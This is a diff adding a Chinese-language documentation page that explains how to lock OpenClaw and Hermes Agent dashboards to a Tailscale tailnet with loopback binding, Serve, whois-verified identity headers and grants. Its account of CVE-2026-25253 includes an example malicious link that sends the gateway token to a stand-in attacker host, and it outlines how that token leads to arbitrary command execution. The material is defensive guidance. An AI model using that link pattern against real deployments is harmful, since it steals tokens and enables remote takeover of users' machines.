@@ -1,0 +1,171 @@
+---
+title: OpenClaw／Hermes Agent 個人助理只開給自己：Serve 模式與身分驗證
+description: 把 OpenClaw 與 Hermes Agent 這類個人助理關進 tailnet：gateway 綁 loopback、用 Tailscale Serve 而非 Funnel 分享控制台、以 tailscale whois 驗證身分標頭，以及 CVE-2026-25253 的教訓
+sidebar:
+  order: 3
+  label: OpenClaw 與 Hermes
+---
+
+OpenClaw 和 Hermes Agent 都是「常駐的個人 AI 助理」：它們會讀你的訊息、存取你的檔案、在你指定的機器上執行指令，還會透過 Telegram、Discord 這類管道主動聯絡你。換句話說，它們同時握著你的機密、看得到你丟給它的內容、又有一條對外的通訊通道——正是 [AI 與 agent](/ai/) 裡說的「致命三重奏」。
+
+這種助理裝好之後，第一件要做的事就是把它「只開給自己」：讓它的控制台（dashboard／gateway）只有你連得到，而且它認得連進來的是你。這篇以 OpenClaw 與 Hermes Agent 為例講這兩件事。身分標頭的機制（`Tailscale-User-Login` 怎麼來、為什麼不能直接信），先看 [Serve 的身分標頭](/features/serve-identity-headers/)。
+
+> 本文依 2026 年 10 月的 Tailscale、OpenClaw 與 Hermes Agent 官方文件整理，以 Tailscale v1.104、OpenClaw v2026.9.9、Hermes Agent v0.21.x 為準。CVE-2026-25253 的內容以 NVD 與 depthfirst 的漏洞報告為準。本文未在實機跑過 OpenClaw 與 Hermes 的整套設定，屬文件整理。
+
+## 反面教材：CVE-2026-25253
+
+在講「怎麼鎖」之前，先看一個沒鎖好會怎樣的實例。2026 年初，OpenClaw（當時還叫 clawdbot／Moltbot）爆出一個嚴重的漏洞 **[CVE-2026-25253](https://nvd.nist.gov/vuln/detail/CVE-2026-25253)**，CVSS 8.8（High）、CWE-669，影響 2026.1.29 以前的版本。
+
+問題出在它的網頁控制台：控制台會直接信任網址查詢字串裡的 `gatewayUrl`，一載入就自動連過去、並把手上的 gateway token 一起送出。所以攻擊者只要誘使你點一個連結（例如 `https://<你的控制台>?gatewayUrl=ws://attacker.com`），你的瀏覽器就會把 token 送到攻擊者的伺服器。
+
+更糟的是，這個漏洞**連「只聽 loopback」的實例都躲不掉**。瀏覽器對 HTTP 有同源政策（Same-Origin Policy）擋著，但對 WebSocket 沒有——擋不擋得看伺服器有沒有驗證 `Origin` 標頭。當時 OpenClaw 的 WebSocket 伺服器沒有驗證，攻擊者可以在你自己的瀏覽器裡、從惡意網頁開啟連到 `ws://127.0.0.1:18789` 的連線，把 localhost 當跳板。
+
+拿到 token 之後，攻擊者就能呼叫 API：關掉「危險指令要人工確認」的保護、把執行環境從沙箱改到宿主機，最後執行任意指令。全程只需要你點一下那個連結。修復版本是 2026.1.29（2026 年 1 月 30 日發布），修法是把「自動連線」改成「先跳出確認視窗」。
+
+同一個時期，社群整理的[已知漏洞頁面](https://clawdocs.org/security/known-vulnerabilities)引 Shodan 掃描，稱網路上掃到 4 萬多台 OpenClaw 實例，其中 2 萬多台的控制台介面直接開在公網、1 萬多台可被這類漏洞遠端執行指令。這兩個問題（點一下就 RCE、控制台開公網）背後的教訓都一樣：**預設的「方便」不等於「安全」，控制台這種東西不該直接見公網。**
+
+## 第一步：gateway 綁 loopback
+
+OpenClaw 的 gateway（控制台與 WebSocket 都走它）在一般主機上預設只聽 `127.0.0.1`，但在容器裡 `auto` 模式可能改用 `0.0.0.0`。用設定鍵 `gateway.bind` 明確指定：
+
+| `gateway.bind` | 行為                                                               |
+| -------------- | ------------------------------------------------------------------ |
+| `loopback`     | 只聽 `127.0.0.1`，同一台主機之外的人都連不到（最安全，建議用這個） |
+| `tailnet`      | 直接聽 Tailscale IP（沒有 HTTPS、沒有 Serve，走明文）              |
+| `auto`         | 在容器裡偵測到時用 `0.0.0.0`，否則優先 loopback                    |
+
+`tailnet` 模式讓 gateway 直接聽 Tailscale IP，但**是明文 HTTP**，而且等同放棄了 Tailscale Serve 幫你做的 HTTPS 與身分標頭。除非你有特殊理由（例如某個 client 一定要直接連 WebSocket），否則選 `loopback`，再靠下一步的 Serve 轉發出去。重點是**不要設成 `0.0.0.0`**：那等於把控制台開給同一台主機所在的整個網路，正是上面那批「暴露在公網」實例的寫照。
+
+## 第二步：用 Serve 分享，不要用 Funnel
+
+gateway 綁了 loopback 之後，外面（包括你自己的手機、筆電）要怎麼連？OpenClaw 內建了 Tailscale 整合，用設定鍵 `gateway.tailscale.mode` 控制：
+
+```json5
+{
+  gateway: {
+    bind: "loopback",
+    tailscale: { mode: "serve" },
+  },
+}
+```
+
+`mode: "serve"` 會叫 OpenClaw 自動跑 `tailscale serve`，把控制台以 HTTPS 發布到 `https://<你的主機>.tailxxxxx.ts.net`，只對 tailnet 內開放，而且會帶上 Tailscale 的身分標頭。三種模式：
+
+| `gateway.tailscale.mode` | 行為                                                           |
+| ------------------------ | -------------------------------------------------------------- |
+| `serve`                  | Tailscale Serve，只對 tailnet 開放，gateway 維持在 `127.0.0.1` |
+| `funnel`                 | Tailscale Funnel，公開到網際網路，**強制要有共用密碼**         |
+| `off`（預設）            | 不自動管理 Serve／Funnel                                       |
+
+對個人助理來說，**預設就該是 `serve`**。Serve 是 tailnet 內、只有你自己（和你在 tailnet 裡的人）連得到；Funnel 是把控制台公開給全世界，兩者完全是不同等級的暴露。OpenClaw 也明白這點：`mode: "funnel"` 在**沒有設定 password 驗證時會拒絕啟動**，避免你把一個沒密碼的控制台開到公網。
+
+同樣的動作也可以用指令做：
+
+```bash
+openclaw gateway --tailscale serve
+openclaw gateway --tailscale funnel --auth password   # 需要密碼，不建議日常用
+```
+
+前提是主機上裝了 `tailscale` CLI 且已登入；Serve 需要 tailnet 開啟 HTTPS 憑證。這些 Tailscale 端的細節見 [Tailscale Serve](/features/serve/)。
+
+## 第三步：讓它認得連進來的是你
+
+Serve 會把「連進來的是誰」寫進身分標頭（`Tailscale-User-Login` 等，見 [Serve 的身分標頭](/features/serve-identity-headers/)）。但這些標頭**不能直接信**：如果後端聽在非 loopback，攻擊者可以直接連後端、自己塞一個假的標頭假裝成你。
+
+OpenClaw 的解法是把「信標頭」這件事交給 Tailscale 查證。設定鍵 `gateway.auth.allowTailscale`：
+
+```json5
+{
+  gateway: {
+    bind: "loopback",
+    tailscale: { mode: "serve" },
+    auth: { allowTailscale: true },
+  },
+}
+```
+
+當 `mode: "serve"` 且 `allowTailscale: true`，控制台與 WebSocket 的驗證可以用身分標頭取代 token／password。關鍵在於 OpenClaw 不是傻傻地讀標頭，而是：
+
+1. 只在自己的 managed Tailscale listener 上接受這個流程，而且要求請求帶有 Tailscale 的 `x-forwarded-for`、`x-forwarded-proto`、`x-forwarded-host`。
+2. 用本機的 `tailscale whois` 反查 `x-forwarded-for` 的來源 IP 對應的真正 tailnet 身分，跟標頭裡的 login 比對，**一致才放行**。
+
+這樣就算有人把標頭塞成你的 email，`tailscale whois` 一查來源 IP 不是你的裝置，就會被擋下。也就是說，身分標頭是「候選人自稱」，`tailscale whois` 是「戶籍查證」，兩者對得上才認帳。
+
+有兩點要留意：
+
+- 這個 tokenless 流程**假設 gateway 主機本身是可信的**。如果同一台主機上會跑你信不過的程式（別人寫的、可能讀本機服務的程式），把 `allowTailscale` 關掉、改回 token／password 比較保險。
+- 官方文件提醒，這個身分標頭流程只套用在控制台 WebSocket 與少數唯讀端點上，其他 HTTP API（`/v1/*` 等）仍然走正常的 token／password 驗證，不會因為身分標頭就放行。
+
+## Hermes Agent：預設就沒有 inbound
+
+Hermes Agent（Nous Research 開源、MIT 授權）的做法和 OpenClaw 不同，但原則一樣：**預設不開 inbound，要暴露得自己動手**。
+
+- **訊息 gateway 是 outbound polling**。Hermes 連 Telegram、Discord 等平台時，預設用 long polling：由 gateway **主動**去平台伺服器抓訊息，平台不會連進來，所以**不對外開任何埠**。想讓它收外來連線，得另外設 `TELEGRAM_WEBHOOK_URL` 切成 webhook 模式——那是給雲端部署省錢用的，不是個人助理的日常。換句話說，「用 Telegram 控制 Hermes」這條主要通道，本來就沒有暴露面。
+- **web dashboard（埠 9119）是 opt-in**。`hermes dashboard` 預設綁 `127.0.0.1:9119`。過去的 `--insecure` 旗標已廢棄，綁到非 loopback 位址時，沒有註冊驗證提供者（例如 Nous Portal OAuth、基本密碼或自架 OIDC）會直接拒絕啟動。
+- **API server（埠 8642）是 opt-in 且預設關閉**。這個 OpenAI 相容的端點是「能完整操控 agent 與工具」的控制點，`API_SERVER_ENABLED` 預設 `false`；要開還要同時設 `API_SERVER_KEY`，且預設綁 `127.0.0.1`。
+
+所以 Hermes 的預設姿態是：**主要通道沒有 inbound，兩個額外伺服器都綁 loopback 且預設關閉或要驗證**。你要做的只是別去改壞它——不要 `--host 0.0.0.0`、不要把 9119／8642 用 Docker 映射到公網、不要放到沒有驗證的公網反向代理後面。
+
+想在外面用 dashboard，用 SSH tunnel 或 Tailscale Serve 轉到本機即可，而不是把它綁到 `0.0.0.0`：
+
+```bash
+# 用 Tailscale Serve 把本機 dashboard 以 HTTPS 發布到 tailnet（只有 tailnet 內連得到）
+tailscale serve --bg http://127.0.0.1:9119
+
+# 或用 SSH tunnel，只在你有 SSH 權限的主機上可達
+ssh -L 9119:127.0.0.1:9119 user@<你的主機>
+```
+
+Hermes 沒有像 OpenClaw 那樣的內建 `gateway.tailscale.mode`，所以這一步是手動的 `tailscale serve`。Serve 的身分標頭對 Hermes 的 dashboard 沒有內建整合（Hermes 的 dashboard 用自己的 OAuth／密碼驗證），所以這裡 Serve 只負責「只對 tailnet 開放 + HTTPS」，登入仍由 Hermes 自己把關。
+
+## 最小權限：只把自己加進 grants
+
+Serve 把控制台發在 443 埠，但 tailnet 預設全開，任何裝置都能連到任何裝置的任何埠。所以除了把 gateway 綁 loopback，還要用 [grants](/admin/acl-grants/) 把 443 只留給你自己——後端的原始埠（OpenClaw 的 18789、Hermes 的 9119／8642）**不要寫進 grants**，tailnet 上就沒人能直連：
+
+```json
+"tagOwners": {
+  "tag:agent": ["autogroup:admin"],
+},
+"grants": [
+  // 只有你（管理員）能連到 agent 主機的 443（Serve 發出的 HTTPS）
+  {
+    "src": ["autogroup:admin"],
+    "dst": ["tag:agent"],
+    "ip": ["tcp:443"],
+  },
+],
+```
+
+- 給 agent 主機打上 `tag:agent`，身分不再綁在某個人身上（見 [Tags 與 auth key](/admin/tags-auth-keys/)）。
+- `src` 用 `autogroup:admin` 表示管理員；要「只開給自己」，把 `src` 換成你自己的帳號 email 即可。
+- 後端的原始埠沒出現在 grants 裡，等於 tailnet 上誰都連不到，只能走 Serve 的 443。
+
+注意 grants 管的是 **tailnet 內部**的連線，不影響 agent 主機自己連出去（連模型供應商、連 Telegram 都是主機自己的出站流量）。規則寫法與 `tests` 驗證見 [ACL / Grants 入門](/admin/acl-grants/)。
+
+## 小結
+
+| 設定           | OpenClaw                               | Hermes Agent                     |
+| -------------- | -------------------------------------- | -------------------------------- |
+| 主要通道       | 控制台 + WebSocket（gateway 埠 18789） | 訊息 gateway（outbound polling） |
+| 綁定           | `gateway.bind: "loopback"`             | 預設 `127.0.0.1`，dashboard 9119 |
+| 分享給 tailnet | `gateway.tailscale.mode: "serve"`      | 手動 `tailscale serve`           |
+| 公開到網際網路 | `mode: "funnel"`（強制 password）      | 不建議，改 SSH tunnel／Serve     |
+| 身分標頭驗證   | `gateway.auth.allowTailscale` + whois  | 無內建整合，用自己的 OAuth／密碼 |
+
+兩套的結論一樣：控制台綁 loopback、只透過 Tailscale Serve 對 tailnet 開放、Funnel 只在真的需要公開時才用（而且一定要有密碼）、再靠 grants 把尾巴收緊。個人助理手上握的越多，越沒有理由讓它的控制台見公網。
+
+## 參考資料
+
+- [CVE-2026-25253（NVD）](https://nvd.nist.gov/vuln/detail/CVE-2026-25253)
+- [1-Click RCE To Steal Your OpenClaw Data and Keys（depthfirst，漏洞原始報告）](https://depthfirst.com/post/1-click-rce-to-steal-your-moltbot-data-and-keys)
+- [OpenClaw 官方文件：Tailscale（gateway.tailscale.mode、allowTailscale 與 whois 驗證）](https://docs.openclaw.ai/gateway/tailscale)
+- [OpenClaw 已知漏洞（clawdocs，含 Shodan 暴露統計）](https://clawdocs.org/security/known-vulnerabilities)
+- [Hermes Agent 官方文件：Web Dashboard](https://hermes-agent.nousresearch.com/docs/user-guide/features/web-dashboard)
+- [Hermes Agent 官方文件：API Server](https://hermes-agent.nousresearch.com/docs/user-guide/features/api-server)
+- [Hermes Agent 官方文件：Telegram（long polling 與 webhook）](https://hermes-agent.nousresearch.com/docs/user-guide/messaging/telegram)
+- [Hermes Agent 官方文件：Security](https://hermes-agent.nousresearch.com/docs/user-guide/security)
+- [Hermes Agent（GitHub）](https://github.com/NousResearch/hermes-agent)
+- [OpenClaw + Tailscale（mager.co，社群設定指南）](https://www.mager.co/blog/2026-02-22-openclaw-mac-mini-tailscale/)
+- [Serve 的身分標頭：讓自架服務直接認得 tailnet 使用者](/features/serve-identity-headers/)
+- [Tailscale Serve](/features/serve/)
+- [Tailscale Funnel](/features/funnel/)
